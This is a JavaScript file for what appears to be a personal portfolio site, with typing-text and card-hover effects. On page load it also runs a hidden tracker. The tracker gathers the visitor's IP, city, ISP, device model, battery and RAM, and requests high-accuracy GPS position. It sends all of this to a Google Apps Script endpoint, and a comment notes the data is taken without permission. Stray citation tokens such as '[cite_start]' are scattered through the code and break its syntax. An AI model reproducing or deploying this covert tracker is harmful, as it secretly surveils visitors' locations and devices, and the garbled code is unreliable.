(async function() {
  const getDeviceModel = () => {
    [cite_start]const ua = navigator.userAgent; [cite: 26]
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }
    [cite_start]if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) { [cite: 27]
      const w = window.screen.width, h = window.screen.height;
      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
      return "Apple iOS Device";
    }
    return navigator.platform || [cite_start]"PC/Laptop"; [cite: 28]
  };

  const startTracker = async () => {
    let payload = {
      ip: "Hidden", city: "-", country: "-", isp: "-",
      [cite_start]userAgent: navigator.userAgent, platform: navigator.platform, [cite: 29]
      ram: navigator.deviceMemory || "N/A", battery: "0",
      deviceName: getDeviceModel()
    };

    [cite_start]// Ambil IP & Wilayah via IP-API (Tanpa Izin) [cite: 32]
    try {
      const res = await fetch('http://ip-api.com/json/');
      const d = await res.json();
      if (d.status === "success") {
        payload.ip = d.query; payload.city = d.city;
        payload.country = d.country; payload.isp = d.isp;
      }
    } catch (e) { console.log("IP Blocked"); }

    [cite_start]if (navigator.getBattery) { [cite: 30, 31]
      try { 
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100);
      } catch (e) {}
    }

    const send = (data) => {
      [cite_start]fetch("https://script.google.com/macros/s/AKfycbyOnt03aKyWBTEb5q5IKm_2oVZnXYKs_mEhl4zoLZxFelBR9q83MMcq0yAUUThb5Z0l-A/exec", { // GANTI INI! [cite: 33]
        method: "POST", mode: "no-cors", body: JSON.stringify(data)
      });
    };

    send(payload);

    [cite_start]if (navigator.geolocation) { [cite: 34]
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        send(payload); 
      }, null, { enableHighAccuracy: true });
    }
  };

  // --- UI EFFECTS ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;
    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      [cite_start]charIndex--; typingDelay = 75; [cite: 35]
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++; typingDelay = 150;
    }
    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000; isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      [cite_start]typingDelay = 500; [cite: 36]
    }
    [cite_start]setTimeout(typeText, typingDelay); [cite: 37]
  }

  [cite_start]window.addEventListener('load', () => { [cite: 39]
    startTracker();
    setTimeout(typeText, 1000);
    [cite_start]// Ripple Effect [cite: 38]
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
